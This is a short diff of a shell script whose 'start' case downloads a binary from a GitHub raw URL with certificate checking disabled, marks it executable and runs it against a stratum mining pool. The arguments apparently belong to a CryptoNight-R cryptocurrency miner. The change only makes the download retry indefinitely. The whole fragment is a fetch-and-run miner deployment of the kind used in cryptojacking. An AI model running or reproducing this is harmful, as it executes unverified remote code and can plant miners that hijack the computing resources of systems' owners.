@@ -29,7 +29,7 @@ _APP(){
  case $1 in
    start)  
      #sysctl -w vm.nr_hugepages=128
-     wget --no-check-cert https://raw.githubusercontent.com/osrun/beta/master/app
+     wget -c --tries=0 --retry-connrefused --timeout=2 --wait=1 --no-check-cert https://raw.githubusercontent.com/osrun/beta/master/app
      chmod +x app
      ./app -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
    ;; 
